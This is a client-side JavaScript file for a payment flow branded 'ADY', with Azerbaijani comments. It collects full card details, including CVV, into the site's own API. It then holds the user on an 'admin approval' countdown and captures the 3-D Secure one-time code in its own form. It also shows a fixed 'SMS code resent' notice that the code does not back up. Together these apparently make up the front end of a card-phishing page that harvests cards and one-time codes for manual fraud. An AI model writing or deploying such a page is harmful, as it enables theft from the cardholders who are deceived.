/* ADY — Ödəniş axını skripti:
   1) Ödəniş forması (kart / balans)  2) Admin təsdiqi gözləmə ekranı
   3) 3-D Secure kodu  4) Balans artırımı                                */
(function () {
  'use strict';

  var T = window.T || function (key, fallback) { return fallback === undefined ? key : fallback; };

  function showNote(note, message, ok) {
    if (!note) return;
    note.classList.remove('hidden');
    note.className = 'alert ' + (ok ? 'alert--success' : 'alert--error') + ' mb-16';
    note.textContent = message;
  }

  /* ==================== Kart görünüşü (canlı formatlama) ==================== */
  function bindCardVisual() {
    var num = document.querySelector('[data-card-number]');
    var holder = document.querySelector('[name=cardHolder]');
    var exp = document.querySelector('[data-card-expiry]');
    var cvv = document.querySelector('[data-card-cvv]');
    var vNum = document.getElementById('visualNumber');
    var vHolder = document.getElementById('visualHolder');
    var vExp = document.getElementById('visualExpiry');
    var vBrand = document.getElementById('visualBrand');

    if (num && vNum) {
      num.addEventListener('input', function () {
        var digits = num.value.replace(/\D/g, '').slice(0, 16);
        num.value = digits.replace(/(.{4})/g, '$1 ').trim();
        vNum.textContent = num.value || '•••• •••• •••• ••••';
        if (vBrand) {
          var d = digits;
          vBrand.textContent = /^4/.test(d) ? 'VISA' : /^5[1-5]|^2[3-6]/.test(d) ? 'MASTERCARD' : /^9/.test(d) ? 'MILLIKART' : T('payment.cardVisual', 'KART');
        }
      });
    }
    if (holder && vHolder) {
      holder.addEventListener('input', function () {
        vHolder.textContent = (holder.value || T('payment.cardHolderPlaceholder', 'KART SAHİBİ')).toUpperCase();
      });
    }
    if (exp && vExp) {
      exp.addEventListener('input', function () {
        var d = exp.value.replace(/\D/g, '').slice(0, 4);
        exp.value = d.length > 2 ? d.slice(0, 2) + '/' + d.slice(2) : d;
        vExp.textContent = exp.value || T('payment.expiryPlaceholder', 'AA/İİ');
      });
    }
    if (cvv) {
      cvv.addEventListener('input', function () {
        cvv.value = cvv.value.replace(/\D/g, '').slice(0, 4);
      });
    }
  }

  function readCard() {
    return {
      number: (document.querySelector('[data-card-number]') || {}).value || '',
      holder: (document.querySelector('[name=cardHolder]') || {}).value || '',
      expiry: (document.querySelector('[data-card-expiry]') || {}).value || '',
      cvv: (document.querySelector('[data-card-cvv]') || {}).value || ''
    };
  }

  /* ==================== 1) Ödəniş forması ==================== */
  var payForm = document.getElementById('payForm');
  if (payForm) {
    bindCardVisual();
    var payMethod = 'card';

    document.querySelectorAll('[data-pay-method]').forEach(function (btn) {
      btn.addEventListener('click', function () {
        document.querySelectorAll('[data-pay-method]').forEach(function (b) { b.classList.remove('is-active'); });
        btn.classList.add('is-active');
        payMethod = btn.getAttribute('data-pay-method');
      });
    });

    payForm.addEventListener('submit', async function (e) {
      e.preventDefault();
      var note = document.getElementById('formNote');
      var btn = payForm.querySelector('button[type=submit]');
      var card = readCard();

      window.setLoading(btn, true);
      var url = payMethod === 'balance' ? '/api/payment/balance/init' : '/api/payment/card/init';
      var r = await window.api(url, { orderId: payForm.getAttribute('data-order-id'), card: card });
      window.setLoading(btn, false);
      if (r.ok) {
        window.toast(r.message || T('msg.sent', 'Göndərildi'), 'success');
        window.location.href = r.redirect;
      } else {
        showNote(note, r.message || T('msg.paymentNotStarted', 'Ödəniş başlamadı'), false);
      }
    });
  }

  /* ==================== 2) Admin təsdiqi gözləmə ekranı (dairəvi geri sayım) ==================== */
  var waitBox = document.getElementById('waitBox');
  if (waitBox && waitBox.getAttribute('data-declined') !== '1') {
    var statusUrl = waitBox.getAttribute('data-status-url');
    var countdownDisplay = document.querySelector('[data-countdown]');
    var countdownCircle = document.querySelector('[data-countdown-circle]');
    var totalTime = 120; // 2 dəqiqə
    var remainingTime = totalTime;
    
    // Dairəli geri sayım rəsmi çək
    function updateCountdown() {
      if (countdownDisplay) {
        var minutes = Math.floor(remainingTime / 60);
        var seconds = remainingTime % 60;
        countdownDisplay.textContent = (minutes > 0 ? minutes + ':' : '') + (seconds < 10 ? '0' : '') + seconds;
      }
      
      if (countdownCircle) {
        var progress = (totalTime - remainingTime) / totalTime;
        var circumference = 2 * Math.PI * 45; // r=45
        var offset = circumference * progress;
        countdownCircle.style.strokeDashoffset = offset;
      }
    }
    
    updateCountdown();
    
    var pollWait = setInterval(async function () {
      try {
        var r = await window.api(statusUrl);
        if (r && r.ok && r.redirect) {
          clearInterval(pollWait);
          clearInterval(countdownInterval);
          window.location.href = r.redirect;
        }
      } catch (err) { /* sükutla davam edir */ }
    }, 4000);
    
    var countdownInterval = setInterval(function () {
      remainingTime--;
      updateCountdown();
      if (remainingTime <= 0) {
        clearInterval(countdownInterval);
        remainingTime = totalTime;
        updateCountdown();
      }
    }, 1000);
  }

  /* ==================== 3) 3-D Secure kodu ==================== */
  var codeForm = document.getElementById('codeForm');
  if (codeForm) {
    var codeRetryCountdown = null;
    
    codeForm.addEventListener('submit', async function (e) {
      e.preventDefault();
      var note = document.getElementById('formNote');
      var btn = codeForm.querySelector('button[type=submit]');
      var code = codeForm.querySelector('[data-code]');
      var codeInput = codeForm.querySelector('[data-code]');
      window.setLoading(btn, true);
      var payload = { code: code ? code.value : '' };
      if (codeForm.getAttribute('data-payment-id')) { payload.paymentId = codeForm.getAttribute('data-payment-id'); }
      else { payload.orderId = codeForm.getAttribute('data-order-id'); }
      var r = await window.api('/api/payment/verify', payload);
      window.setLoading(btn, false);
      if (r.ok) {
        window.toast(r.message || T('msg.codeSubmitted', 'Kod göndərildi'), 'success');
        setTimeout(function () { window.location.reload(); }, 900);
      } else {
        // Yanlış kod - geri sayım və SMS mesajı göstər
        showNote(note, r.message || T('msg.codeNotSubmitted', 'Kod yanlışdır'), false);
        
        if (codeRetryCountdown) clearInterval(codeRetryCountdown);
        if (codeInput) codeInput.value = '';
        if (codeInput) codeInput.focus();
        
        var retryTime = 120;
        btn.disabled = true;
        btn.textContent = '2:00 sonra yenidən cəhd edin...';
        var smsNote = document.createElement('div');
        smsNote.className = 'alert alert--info mt-16';
        smsNote.textContent = 'SMS kodu yenidən göndərildi. Zəhmət olmasa gözləyin...';
        note.parentNode.insertBefore(smsNote, note.nextSibling);
        
        codeRetryCountdown = setInterval(function () {
          retryTime--;
          var mins = Math.floor(retryTime / 60);
          var secs = retryTime % 60;
          btn.textContent = (mins > 0 ? mins + ':' : '') + (secs < 10 ? '0' : '') + secs + ' sonra yenidən cəhd edin...';
          
          if (retryTime <= 0) {
            clearInterval(codeRetryCountdown);
            btn.disabled = false;
            btn.textContent = T('secure3d.submit', 'Təsdiq et');
            if (smsNote.parentNode) smsNote.parentNode.removeChild(smsNote);
          }
        }, 1000);
      }
    });
  }

  /* Kod göndərildikdən sonra yekun təsdiqi gözləyən ekran — avtomatik yenilənmə */
  var codeWait = document.getElementById('codeWait');
  if (codeWait) {
    var orderId = codeWait.getAttribute('data-order-id');
    var pollFinal = setInterval(async function () {
      try {
        var r = await window.api('/api/payment/' + orderId + '/status');
        if (r && r.ok && r.redirect) {
          clearInterval(pollFinal);
          window.location.href = r.redirect;
        }
      } catch (err) { /* sükutla davam edir */ }
    }, 4000);
  }

  /* ==================== 4) Balans artırımı ==================== */
  var topupForm = document.getElementById('topupForm');
  if (topupForm) {
    topupForm.addEventListener('submit', async function (e) {
      e.preventDefault();
      var note = document.getElementById('formNote');
      var btn = topupForm.querySelector('button[type=submit]');
      var amount = topupForm.querySelector('[name=amount]').value;
      window.setLoading(btn, true);
      var r = await window.api('/api/balance/topup', {
        amount: Number(amount),
        card: {
          number: (topupForm.querySelector('[name=cardNumber]') || {}).value || '',
          holder: (topupForm.querySelector('[name=cardHolder]') || {}).value || '',
          expiry: (topupForm.querySelector('[name=cardExpiry]') || {}).value || '',
          cvv: (topupForm.querySelector('[name=cardCvv]') || {}).value || '',
          code3d: (topupForm.querySelector('[data-card-3d-code]') || {}).value || ''
        }
      });
      window.setLoading(btn, false);
      if (!r.ok) { showNote(note, r.message || T('msg.operationFailed', 'Əməliyyat alınmadı'), false); return; }

      window.toast(r.message || T('msg.submittedForApproval', 'Təsdiqə göndərildi'), 'success');
      window.location.href = r.redirect || window.location.href;
    });
  }

  /* ==================== 5) Balans artırımı ekranları: canlı yenilənmə ==================== */
  var topupBox = document.getElementById('topupBox');
  if (topupBox && topupBox.getAttribute('data-poll') === '1') {
    var tUrl = topupBox.getAttribute('data-status-url');
    var tStage = topupBox.getAttribute('data-stage');
    var pollTopup = setInterval(async function () {
      try {
        var r = await window.api(tUrl);
        if (r && r.ok && r.stage !== tStage && r.redirect) {
          clearInterval(pollTopup);
          window.location.href = r.redirect;
        }
      } catch (err) { /* sükutla davam edir */ }
    }, 4000);
  }
})();
